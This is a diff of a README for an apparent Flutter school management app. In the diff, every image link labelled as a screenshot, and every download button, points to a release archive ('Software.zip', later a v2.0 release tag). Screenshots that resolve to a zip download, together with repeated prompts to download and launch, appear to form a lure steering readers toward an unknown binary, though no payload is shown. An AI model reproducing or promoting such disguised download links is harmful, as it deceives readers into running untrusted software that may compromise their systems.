@@ -3,7 +3,7 @@
 
 Welcome to the School Management System Flutter App repository! This project is a comprehensive Flutter Web and Mobile application designed for managing various school operations, handling authentication processes, and efficiently managing school data. 
 
-![School Management System](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
+![School Management System](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)
 
 ## Features 🚀
 
@@ -27,13 +27,13 @@ To get started with the School Management System Flutter App, follow these steps
 
 Here are some snapshots of the School Management System Flutter App in action:
 
-![Login Screen](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
+![Login Screen](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)
 *Login screen for secure access*
 
-![Dashboard View](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
+![Dashboard View](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)
 *Dashboard view for quick insights*
 
-![Student Management](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
+![Student Management](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)
 *Student management interface for easy tracking*
 
 ## Technologies Used 💻
@@ -45,13 +45,13 @@ Here are some snapshots of the School Management System Flutter App in action:
 
 ## Get Started 🌟
 
-Ready to experience the School Management System Flutter App? [Download the latest release here](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
+Ready to experience the School Management System Flutter App? [Download the latest release here](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)
 
 ### Launch the School Management System Flutter App
 
 Click the button below to download the latest release and launch the app.
 
-[![Download App](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
+[![Download App](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/tag/v2.0)
 
 ## Contributions 🤝
 
